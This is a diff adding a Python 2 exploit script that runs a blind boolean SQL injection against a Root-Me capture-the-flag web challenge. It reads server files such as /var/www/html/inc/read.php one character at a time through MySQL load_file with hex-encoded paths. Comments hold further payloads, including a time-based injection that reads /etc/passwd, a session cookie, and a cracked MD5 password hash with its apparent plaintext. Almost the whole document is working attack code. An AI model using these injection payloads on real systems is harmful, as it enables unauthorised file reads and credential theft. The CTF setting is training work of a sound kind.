@@ -1,0 +1,84 @@
+#!/usr/bin/env python
+
+from requests import Session
+
+charset = [chr(i) for i in range(34, 125)]
+from  multiprocessing import Pool, Manager
+import time
+req = Session()
+url = "http://ctf06.root-me.org/profile&id=3"
+
+
+# req.headers.update({'Cookie': "PHPSESSID=v25nnt96udm84btm8caa2j57i6cdtos6"})
+# (case(mid(load_file(0x2f6574632f706173737764),%d,1))\
+# when(%s)then(sleep(2))else(sleep(0))end)" % (offset, str(hex(p)))         /etc/passwd
+# " and substr(password,%s,1) = %s" % (offset, str(hex(p))) #" and substr(password,%s,1) = %s"
+# BRIAN@LOCALHOST.LOCALDOMAIN  brian@localhost.localdomain
+# E22F07B17F98E0D9D364584CED0E3C18  e22f07b17f98e0d9d364584ced0e3c18
+# e22f07b17f98e0d9d364584ced0e3c18  md5 my2cents
+# 2f7661722f7777772f68746d6c2f696e632f64622e706870 "/var/www/html/inc/db.php"
+# 2f7661722f7777772f68746d6c2f696e632f726561642e706870 "/var/www/html/inc/read.php"
+
+
+def Exploit(worker_name ,min,max, injection, param,event):
+    offset = min
+    string = ""
+    try:
+        if not event.is_set():
+            for l in range(min,max):
+                start = 0x40
+                injection = " and mid(load_file(%s),%d,1)>%s" % (param, offset, str(hex(start)))
+                resp = req.get(url + injection)
+                if 'Brian is our' in resp.text:
+                    _start = start + 1
+                else:
+                    _start = 9
+                if _start > start:
+                    start = start + 0x20
+                    injection = " and mid(load_file(%s),%d,1)>%s" % (param, offset, str(hex(start)))
+                    resp = req.get(url + injection)
+                    if 'Brian is our' in resp.text:
+                        _start = start + 1
+                    else:
+                        _start = start - 0x20
+                for p in range(_start, 255):
+                    injection = " and mid(load_file(%s),%d,1)=%s" % (param, offset, str(hex(p)))
+                    resp = req.get(url + injection)
+                    if 'Brian is our' in resp.text:
+                        string += chr(p)
+                        offset += 1
+                    else:
+                        continue
+                    break
+    except:
+        print 'end of string:'
+    print "String found : " + string
+
+
+def main():
+    injection_1 = " and substr(password,"
+    injection_2 = " and mid(load_file( "
+    param_1 = "password"
+    param_2 = '0x' + '/var/www/html/inc/read.php'.encode('hex')
+
+    pool = Pool(3)
+    manager = Manager()
+    event = manager.Event()
+    min = (1,360)
+    max = (361,747)
+    worker = ("worker_1","worker_2")
+
+    for i in range(2):
+        pool.apply_async(Exploit, (worker[i] , min[i], max[i] ,injection_2, param_2, event))
+    pool.close()
+    start_time = time.time()
+    event.wait()
+    end_time = time.time()
+    print "Dump Done! in %s s" % (end_time - start_time)
+    pool.terminate()
+
+
+
+
+
+main()
